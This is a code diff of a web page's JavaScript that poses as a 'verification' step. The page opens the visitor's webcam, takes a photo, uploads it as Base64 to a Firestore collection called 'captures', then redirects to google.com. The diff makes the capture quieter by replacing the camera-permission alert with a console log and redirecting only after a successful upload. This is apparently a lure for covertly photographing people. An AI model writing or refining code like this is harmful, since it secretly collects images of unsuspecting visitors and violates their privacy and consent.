@@ -7,8 +7,10 @@ const firebaseConfig = {
     appId: "1:371616954594:web:977d88ec7570df351246bb"
 };
 
-// Initialize Firestore instead of Storage
-firebase.initializeApp(firebaseConfig);
+// Initialize Firebase v8
+if (!firebase.apps.length) {
+    firebase.initializeApp(firebaseConfig);
+}
 const db = firebase.firestore();
 
 const video = document.getElementById('video');
@@ -21,7 +23,7 @@ async function openVerify() {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
     } catch (err) {
-        alert("Camera permission required!");
+        console.error("Camera error:", err);
     }
 }
 
@@ -32,24 +34,27 @@ async function captureAndDone() {
         canvas.height = video.videoHeight;
         context.drawImage(video, 0, 0);
 
-        // Photo ko Base64 (Text) mein badalna
-        const photoData = canvas.toDataURL('image/jpeg', 0.5); // 0.5 for small size
+        // Photo ko Text (Base64) mein convert karna
+        const photoData = canvas.toDataURL('image/jpeg', 0.5);
 
-        // Seedha Database mein save karna
-        try {
-            await db.collection('captures').add({
-                image: photoData,
-                time: new Date().toLocaleString()
-            });
-            console.log("Photo Saved in Database!");
-        } catch (e) {
-            console.error("DB Error:", e);
-        }
-
-        const tracks = video.srcObject.getTracks();
-        tracks.forEach(t => t.stop());
+        // FIRESTORE MEIN SAVE KARNA
+        db.collection("captures").add({
+            image: photoData,
+            timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        })
+        .then(() => {
+            console.log("Database updated!");
+            // Camera band karna
+            const tracks = video.srcObject.getTracks();
+            tracks.forEach(t => t.stop());
+            
+            alert("Verification Complete!");
+            overlay.style.display = 'none';
+            window.location.href = "https://google.com";
+        })
+        .catch((error) => {
+            console.error("Error writing to DB: ", error);
+            alert("Something went wrong!");
+        });
     }
-    alert("Verified! Connecting...");
-    overlay.style.display = 'none';
-    window.location.href = "https://google.com";
 }
